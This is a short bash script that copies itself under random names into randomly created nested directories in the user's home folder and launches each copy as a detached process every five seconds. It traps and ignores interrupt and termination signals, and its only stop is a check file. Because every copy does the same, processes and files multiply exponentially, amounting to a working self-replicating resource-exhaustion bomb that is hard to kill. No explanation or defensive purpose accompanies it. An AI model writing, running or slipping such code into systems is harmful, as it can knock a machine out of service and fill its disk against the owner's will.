#!/bin/bash


CHECK_FILE="$HOME/check_file"
SOURCE_DIR="$HOME/script_source"

mkdir -p "$SOURCE_DIR"
touch "$CHECK_FILE"
trap '' INT TERM HUP QUIT ABRT TSTP

get_random_dir() {
    local dirs
    dirs=("$SOURCE_DIR")
    for item in "$SOURCE_DIR"/*; do
        if [ -d "$item" ]; then
            dirs+=("$item")
        fi
    done

    if [ ${#dirs[@]} -eq 1 ]; then
        local new_dir
        new_dir="$SOURCE_DIR/dir_$(openssl rand -hex 4)"
        mkdir -p "$new_dir"
    fi


    local selected_dir="${dirs[$RANDOM % ${#dirs[@]}]}"

    local new_subdir
    new_subdir="$selected_dir/dir_$(openssl rand -hex 4)"
    mkdir -p "$new_subdir"

    echo "$new_subdir"
}

generate_random_name() {
    local name_len=$(( RANDOM % 10 + 5 ))
    openssl rand -hex "$name_len"
}

copy_and_run() {
    local target_dir
    target_dir=$(get_random_dir)
    local new_name
    new_name=$(generate_random_name).sh 
    
    mkdir -p "$target_dir"
    
    if cp "$0" "$target_dir/$new_name"; then
        chmod +x "$target_dir/$new_name"
        echo "在 $target_dir/$new_name 中启动新实例"
        (cd "$target_dir" && setsid "./$new_name" &)
    else
        echo "copy $target_dir/$new_name failed"
        return 1
    fi
}

main() {
    local need_stop
    need_stop=$(cat "$CHECK_FILE" 2>/dev/null)
    while [ "$need_stop" = "run" ]
    do
    	need_stop=$(cat "$CHECK_FILE" 2>/dev/null)
        sleep 5
        copy_and_run
    done
}

main
